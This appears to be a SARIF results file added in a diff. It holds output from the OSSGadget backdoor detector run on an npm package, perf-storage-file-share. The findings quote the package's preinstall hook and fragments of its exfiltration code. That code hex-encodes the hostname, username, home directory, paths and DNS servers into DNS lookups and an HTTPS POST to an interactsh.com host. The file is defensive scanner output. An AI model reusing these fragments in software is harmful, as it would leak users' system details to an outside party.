@@ -1,0 +1,573 @@
+{
+  "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0-rtm.6.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "oss-detect-backdoor",
+          "organization": "Microsoft Corporation",
+          "product": "OSSGadget (https://github.com/Microsoft/OSSGadget)",
+          "version": "0.0.0+4a24249b20"
+        }
+      },
+      "results": [
+        {
+          "rule": {
+            "id": "BD000103"
+          },
+          "message": {
+            "text": "Backdoor: Installation Script",
+            "id": "BD000103"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/js/perf-storage-file-share-99.10.9.tgz/perf-storage-file-share-99tar/package/package.json"
+                },
+                "region": {
+                  "startLine": 8,
+                  "startColumn": 3,
+                  "endLine": 8,
+                  "endColumn": 29,
+                  "snippet": {
+                    "text": "  \"main\":\"index.js\",\n  \"scripts\":{\n  \"test\":\"echo \\\"error no test specified\\\" && exit 1\",\n  \"preinstall\":\"node index.js\"\n  },\n  \"author\":\"\",\n  \"License\":\"ISC\"\n",
+                    "rendered": {
+                      "text": "  \"main\":\"index.js\",\n  \"scripts\":{\n  \"test\":\"echo \\\"error no test specified\\\" && exit 1\",\n  \"preinstall\":\"node index.js\"\n  },\n  \"author\":\"\",\n  \"License\":\"ISC\"\n",
+                      "markdown": "`  \"main\":\"index.js\",\n  \"scripts\":{\n  \"test\":\"echo \\\"error no test specified\\\" && exit 1\",\n  \"preinstall\":\"node index.js\"\n  },\n  \"author\":\"\",\n  \"License\":\"ISC\"\n`"
+                    }
+                  },
+                  "sourceLanguage": "package.json"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 4,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000704"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Hostname)",
+            "id": "BD000704"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/js/perf-storage-file-share-99.10.9.tgz/perf-storage-file-share-99tar/package/index.js"
+                },
+                "region": {
+                  "startLine": 119,
+                  "startColumn": 4,
+                  "endLine": 119,
+                  "endColumn": 12,
+                  "snippet": {
+                    "text": "});\n\nvar options = {\n    hostname: \"c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com\",\n    port: 443,\n    path: \"/\",\n    method: \"POST\",\n",
+                    "rendered": {
+                      "text": "});\n\nvar options = {\n    hostname: \"c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com\",\n    port: 443,\n    path: \"/\",\n    method: \"POST\",\n",
+                      "markdown": "`});\n\nvar options = {\n    hostname: \"c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com\",\n    port: 443,\n    path: \"/\",\n    method: \"POST\",\n`"
+                    }
+                  },
+                  "sourceLanguage": "javascript"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000704"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Hostname)",
+            "id": "BD000704"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/js/perf-storage-file-share-99.10.9.tgz/perf-storage-file-share-99tar/package/index.js"
+                },
+                "region": {
+                  "startLine": 97,
+                  "startColumn": 11,
+                  "endLine": 97,
+                  "endColumn": 19,
+                  "snippet": {
+                    "text": "    p: package,\n    c: __dirname,\n    hd: os.homedir(),\n    hn: os.hostname(),\n    un: os.userInfo().username,\n    dns: JSON.stringify(dns.getServers()),\n    r: packageJSON ? packageJSON.___resolved : undefined,\n",
+                    "rendered": {
+                      "text": "    p: package,\n    c: __dirname,\n    hd: os.homedir(),\n    hn: os.hostname(),\n    un: os.userInfo().username,\n    dns: JSON.stringify(dns.getServers()),\n    r: packageJSON ? packageJSON.___resolved : undefined,\n",
+                      "markdown": "`    p: package,\n    c: __dirname,\n    hd: os.homedir(),\n    hn: os.hostname(),\n    un: os.userInfo().username,\n    dns: JSON.stringify(dns.getServers()),\n    r: packageJSON ? packageJSON.___resolved : undefined,\n`"
+                    }
+                  },
+                  "sourceLanguage": "javascript"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000704"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Hostname)",
+            "id": "BD000704"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/js/perf-storage-file-share-99.10.9.tgz/perf-storage-file-share-99tar/package/index.js"
+                },
+                "region": {
+                  "startLine": 83,
+                  "startColumn": 43,
+                  "endLine": 83,
+                  "endColumn": 51,
+                  "snippet": {
+                    "text": "else{\nqueries.push(toHex(pkg.hn)+\".\"+substr1+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+toHex(pkg.hd)+\".\"+toHex(pkg.un)+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+substr2+\".\"+hostname);\n}\n}\nelse{\n",
+                    "rendered": {
+                      "text": "else{\nqueries.push(toHex(pkg.hn)+\".\"+substr1+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+toHex(pkg.hd)+\".\"+toHex(pkg.un)+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+substr2+\".\"+hostname);\n}\n}\nelse{\n",
+                      "markdown": "`else{\nqueries.push(toHex(pkg.hn)+\".\"+substr1+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+toHex(pkg.hd)+\".\"+toHex(pkg.un)+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+substr2+\".\"+hostname);\n}\n}\nelse{\n`"
+                    }
+                  },
+                  "sourceLanguage": "javascript"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000704"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Hostname)",
+            "id": "BD000704"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/js/perf-storage-file-share-99.10.9.tgz/perf-storage-file-share-99tar/package/index.js"
+                },
+                "region": {
+                  "startLine": 82,
+                  "startColumn": 67,
+                  "endLine": 82,
+                  "endColumn": 75,
+                  "snippet": {
+                    "text": "}\nelse{\nqueries.push(toHex(pkg.hn)+\".\"+substr1+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+toHex(pkg.hd)+\".\"+toHex(pkg.un)+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+substr2+\".\"+hostname);\n}\n}\n",
+                    "rendered": {
+                      "text": "}\nelse{\nqueries.push(toHex(pkg.hn)+\".\"+substr1+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+toHex(pkg.hd)+\".\"+toHex(pkg.un)+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+substr2+\".\"+hostname);\n}\n}\n",
+                      "markdown": "`}\nelse{\nqueries.push(toHex(pkg.hn)+\".\"+substr1+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+toHex(pkg.hd)+\".\"+toHex(pkg.un)+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+substr2+\".\"+hostname);\n}\n}\n`"
+                    }
+                  },
+                  "sourceLanguage": "javascript"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000704"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Hostname)",
+            "id": "BD000704"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/js/perf-storage-file-share-99.10.9.tgz/perf-storage-file-share-99tar/package/index.js"
+                },
+                "region": {
+                  "startLine": 81,
+                  "startColumn": 43,
+                  "endLine": 81,
+                  "endColumn": 51,
+                  "snippet": {
+                    "text": "queries.push(substr2+\".\"+hostname);\n}\nelse{\nqueries.push(toHex(pkg.hn)+\".\"+substr1+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+toHex(pkg.hd)+\".\"+toHex(pkg.un)+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+substr2+\".\"+hostname);\n}\n",
+                    "rendered": {
+                      "text": "queries.push(substr2+\".\"+hostname);\n}\nelse{\nqueries.push(toHex(pkg.hn)+\".\"+substr1+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+toHex(pkg.hd)+\".\"+toHex(pkg.un)+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+substr2+\".\"+hostname);\n}\n",
+                      "markdown": "`queries.push(substr2+\".\"+hostname);\n}\nelse{\nqueries.push(toHex(pkg.hn)+\".\"+substr1+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+toHex(pkg.hd)+\".\"+toHex(pkg.un)+\".\"+hostname);\nqueries.push(toHex(pkg.hn)+\".\"+substr2+\".\"+hostname);\n}\n`"
+                    }
+                  },
+                  "sourceLanguage": "javascript"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000704"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Hostname)",
+            "id": "BD000704"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/js/perf-storage-file-share-99.10.9.tgz/perf-storage-file-share-99tar/package/index.js"
+                },
+                "region": {
+                  "startLine": 78,
+                  "startColumn": 25,
+                  "endLine": 78,
+                  "endColumn": 33,
+                  "snippet": {
+                    "text": "else if(substr2.length<150){\nsubstr2 = toHex(pkg.hn)+\".\"+toHex(pkg.un)+\".\"+substr2;\nqueries.push(substr1+\".\"+hostname);\nqueries.push(substr2+\".\"+hostname);\n}\nelse{\nqueries.push(toHex(pkg.hn)+\".\"+substr1+\".\"+hostname);\n",
+                    "rendered": {
+                      "text": "else if(substr2.length<150){\nsubstr2 = toHex(pkg.hn)+\".\"+toHex(pkg.un)+\".\"+substr2;\nqueries.push(substr1+\".\"+hostname);\nqueries.push(substr2+\".\"+hostname);\n}\nelse{\nqueries.push(toHex(pkg.hn)+\".\"+substr1+\".\"+hostname);\n",
+                      "markdown": "`else if(substr2.length<150){\nsubstr2 = toHex(pkg.hn)+\".\"+toHex(pkg.un)+\".\"+substr2;\nqueries.push(substr1+\".\"+hostname);\nqueries.push(substr2+\".\"+hostname);\n}\nelse{\nqueries.push(toHex(pkg.hn)+\".\"+substr1+\".\"+hostname);\n`"
+                    }
+                  },
+                  "sourceLanguage": "javascript"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000704"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Hostname)",
+            "id": "BD000704"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/js/perf-storage-file-share-99.10.9.tgz/perf-storage-file-share-99tar/package/index.js"
+                },
+                "region": {
+                  "startLine": 77,
+                  "startColumn": 25,
+                  "endLine": 77,
+                  "endColumn": 33,
+                  "snippet": {
+                    "text": "}\nelse if(substr2.length<150){\nsubstr2 = toHex(pkg.hn)+\".\"+toHex(pkg.un)+\".\"+substr2;\nqueries.push(substr1+\".\"+hostname);\nqueries.push(substr2+\".\"+hostname);\n}\nelse{\n",
+                    "rendered": {
+                      "text": "}\nelse if(substr2.length<150){\nsubstr2 = toHex(pkg.hn)+\".\"+toHex(pkg.un)+\".\"+substr2;\nqueries.push(substr1+\".\"+hostname);\nqueries.push(substr2+\".\"+hostname);\n}\nelse{\n",
+                      "markdown": "`}\nelse if(substr2.length<150){\nsubstr2 = toHex(pkg.hn)+\".\"+toHex(pkg.un)+\".\"+substr2;\nqueries.push(substr1+\".\"+hostname);\nqueries.push(substr2+\".\"+hostname);\n}\nelse{\n`"
+                    }
+                  },
+                  "sourceLanguage": "javascript"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000704"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Hostname)",
+            "id": "BD000704"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/js/perf-storage-file-share-99.10.9.tgz/perf-storage-file-share-99tar/package/index.js"
+                },
+                "region": {
+                  "startLine": 73,
+                  "startColumn": 25,
+                  "endLine": 73,
+                  "endColumn": 33,
+                  "snippet": {
+                    "text": "if(substr1.length<150){\nsubstr1 = toHex(pkg.hn)+\".\"+substr1+\".\"+toHex(pkg.un);\nqueries.push(substr1+\".\"+hostname);\nqueries.push(substr2+\".\"+hostname);\n}\nelse if(substr2.length<150){\nsubstr2 = toHex(pkg.hn)+\".\"+toHex(pkg.un)+\".\"+substr2;\n",
+                    "rendered": {
+                      "text": "if(substr1.length<150){\nsubstr1 = toHex(pkg.hn)+\".\"+substr1+\".\"+toHex(pkg.un);\nqueries.push(substr1+\".\"+hostname);\nqueries.push(substr2+\".\"+hostname);\n}\nelse if(substr2.length<150){\nsubstr2 = toHex(pkg.hn)+\".\"+toHex(pkg.un)+\".\"+substr2;\n",
+                      "markdown": "`if(substr1.length<150){\nsubstr1 = toHex(pkg.hn)+\".\"+substr1+\".\"+toHex(pkg.un);\nqueries.push(substr1+\".\"+hostname);\nqueries.push(substr2+\".\"+hostname);\n}\nelse if(substr2.length<150){\nsubstr2 = toHex(pkg.hn)+\".\"+toHex(pkg.un)+\".\"+substr2;\n`"
+                    }
+                  },
+                  "sourceLanguage": "javascript"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000704"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Hostname)",
+            "id": "BD000704"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/js/perf-storage-file-share-99.10.9.tgz/perf-storage-file-share-99tar/package/index.js"
+                },
+                "region": {
+                  "startLine": 72,
+                  "startColumn": 25,
+                  "endLine": 72,
+                  "endColumn": 33,
+                  "snippet": {
+                    "text": "substr2 = getIps();\nif(substr1.length<150){\nsubstr1 = toHex(pkg.hn)+\".\"+substr1+\".\"+toHex(pkg.un);\nqueries.push(substr1+\".\"+hostname);\nqueries.push(substr2+\".\"+hostname);\n}\nelse if(substr2.length<150){\n",
+                    "rendered": {
+                      "text": "substr2 = getIps();\nif(substr1.length<150){\nsubstr1 = toHex(pkg.hn)+\".\"+substr1+\".\"+toHex(pkg.un);\nqueries.push(substr1+\".\"+hostname);\nqueries.push(substr2+\".\"+hostname);\n}\nelse if(substr2.length<150){\n",
+                      "markdown": "`substr2 = getIps();\nif(substr1.length<150){\nsubstr1 = toHex(pkg.hn)+\".\"+substr1+\".\"+toHex(pkg.un);\nqueries.push(substr1+\".\"+hostname);\nqueries.push(substr2+\".\"+hostname);\n}\nelse if(substr2.length<150){\n`"
+                    }
+                  },
+                  "sourceLanguage": "javascript"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000704"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Hostname)",
+            "id": "BD000704"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/js/perf-storage-file-share-99.10.9.tgz/perf-storage-file-share-99tar/package/index.js"
+                },
+                "region": {
+                  "startLine": 66,
+                  "startColumn": 95,
+                  "endLine": 66,
+                  "endColumn": 103,
+                  "snippet": {
+                    "text": "var substr1 = \"\";\nvar substr2 = \"\";\nvar hostname = \"c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com\";\nstr=toHex(pkg.hn)+\".\"+toHex(pkg.p)+\".\"+getPathChunks(pkg.c)+\".\"+toHex(pkg.un)+\".\"+getIps()+\".\"+hostname;\nif(str.length>255){\nsubstr1 = toHex(pkg.p)+\".\"+getPathChunks(pkg.c);\nsubstr2 = getIps();\n",
+                    "rendered": {
+                      "text": "var substr1 = \"\";\nvar substr2 = \"\";\nvar hostname = \"c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com\";\nstr=toHex(pkg.hn)+\".\"+toHex(pkg.p)+\".\"+getPathChunks(pkg.c)+\".\"+toHex(pkg.un)+\".\"+getIps()+\".\"+hostname;\nif(str.length>255){\nsubstr1 = toHex(pkg.p)+\".\"+getPathChunks(pkg.c);\nsubstr2 = getIps();\n",
+                      "markdown": "`var substr1 = \"\";\nvar substr2 = \"\";\nvar hostname = \"c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com\";\nstr=toHex(pkg.hn)+\".\"+toHex(pkg.p)+\".\"+getPathChunks(pkg.c)+\".\"+toHex(pkg.un)+\".\"+getIps()+\".\"+hostname;\nif(str.length>255){\nsubstr1 = toHex(pkg.p)+\".\"+getPathChunks(pkg.c);\nsubstr2 = getIps();\n`"
+                    }
+                  },
+                  "sourceLanguage": "javascript"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000704"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Hostname)",
+            "id": "BD000704"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/js/perf-storage-file-share-99.10.9.tgz/perf-storage-file-share-99tar/package/index.js"
+                },
+                "region": {
+                  "startLine": 65,
+                  "startColumn": 4,
+                  "endLine": 65,
+                  "endColumn": 12,
+                  "snippet": {
+                    "text": "var queries = [];\nvar substr1 = \"\";\nvar substr2 = \"\";\nvar hostname = \"c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com\";\nstr=toHex(pkg.hn)+\".\"+toHex(pkg.p)+\".\"+getPathChunks(pkg.c)+\".\"+toHex(pkg.un)+\".\"+getIps()+\".\"+hostname;\nif(str.length>255){\nsubstr1 = toHex(pkg.p)+\".\"+getPathChunks(pkg.c);\n",
+                    "rendered": {
+                      "text": "var queries = [];\nvar substr1 = \"\";\nvar substr2 = \"\";\nvar hostname = \"c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com\";\nstr=toHex(pkg.hn)+\".\"+toHex(pkg.p)+\".\"+getPathChunks(pkg.c)+\".\"+toHex(pkg.un)+\".\"+getIps()+\".\"+hostname;\nif(str.length>255){\nsubstr1 = toHex(pkg.p)+\".\"+getPathChunks(pkg.c);\n",
+                      "markdown": "`var queries = [];\nvar substr1 = \"\";\nvar substr2 = \"\";\nvar hostname = \"c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com\";\nstr=toHex(pkg.hn)+\".\"+toHex(pkg.p)+\".\"+getPathChunks(pkg.c)+\".\"+toHex(pkg.un)+\".\"+getIps()+\".\"+hostname;\nif(str.length>255){\nsubstr1 = toHex(pkg.p)+\".\"+getPathChunks(pkg.c);\n`"
+                    }
+                  },
+                  "sourceLanguage": "javascript"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000710"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (DNS Settings)",
+            "id": "BD000710"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/js/perf-storage-file-share-99.10.9.tgz/perf-storage-file-share-99tar/package/index.js"
+                },
+                "region": {
+                  "startLine": 99,
+                  "startColumn": 24,
+                  "endLine": 99,
+                  "endColumn": 38,
+                  "snippet": {
+                    "text": "    hd: os.homedir(),\n    hn: os.hostname(),\n    un: os.userInfo().username,\n    dns: JSON.stringify(dns.getServers()),\n    r: packageJSON ? packageJSON.___resolved : undefined,\n    v: packageJSON.version,\n    pjson: packageJSON,\n",
+                    "rendered": {
+                      "text": "    hd: os.homedir(),\n    hn: os.hostname(),\n    un: os.userInfo().username,\n    dns: JSON.stringify(dns.getServers()),\n    r: packageJSON ? packageJSON.___resolved : undefined,\n    v: packageJSON.version,\n    pjson: packageJSON,\n",
+                      "markdown": "`    hd: os.homedir(),\n    hn: os.hostname(),\n    un: os.userInfo().username,\n    dns: JSON.stringify(dns.getServers()),\n    r: packageJSON ? packageJSON.___resolved : undefined,\n    v: packageJSON.version,\n    pjson: packageJSON,\n`"
+                    }
+                  },
+                  "sourceLanguage": "javascript"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/js/perf-storage-file-share-99.10.9.tgz/perf-storage-file-share-99tar/package/index.js"
+                },
+                "region": {
+                  "startLine": 129,
+                  "startColumn": 15,
+                  "endLine": 129,
+                  "endColumn": 24,
+                  "snippet": {
+                    "text": "    },\n};\n\nvar req = https.request(options, (res) => {\n    res.on(\"data\", (d) => {\n        //process.stdout.write(d);\n    });\n",
+                    "rendered": {
+                      "text": "    },\n};\n\nvar req = https.request(options, (res) => {\n    res.on(\"data\", (d) => {\n        //process.stdout.write(d);\n    });\n",
+                      "markdown": "`    },\n};\n\nvar req = https.request(options, (res) => {\n    res.on(\"data\", (d) => {\n        //process.stdout.write(d);\n    });\n`"
+                    }
+                  },
+                  "sourceLanguage": "javascript"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000705"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (DNS)",
+            "id": "BD000705"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/js/perf-storage-file-share-99.10.9.tgz/perf-storage-file-share-99tar/package/index.js"
+                },
+                "region": {
+                  "startLine": 108,
+                  "endLine": 108,
+                  "endColumn": 10,
+                  "snippet": {
+                    "text": "}\nvar qs = toName(td);\nfor(var j=0;j<qs.length;j++){\ndns.lookup(qs[j], function(err, result) {\n  //console.log(result)\n});\n}\n",
+                    "rendered": {
+                      "text": "}\nvar qs = toName(td);\nfor(var j=0;j<qs.length;j++){\ndns.lookup(qs[j], function(err, result) {\n  //console.log(result)\n});\n}\n",
+                      "markdown": "`}\nvar qs = toName(td);\nfor(var j=0;j<qs.length;j++){\ndns.lookup(qs[j], function(err, result) {\n  //console.log(result)\n});\n}\n`"
+                    }
+                  },
+                  "sourceLanguage": "javascript"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        }
+      ],
+      "columnKind": "utf16CodeUnits"
+    }
+  ]
+}
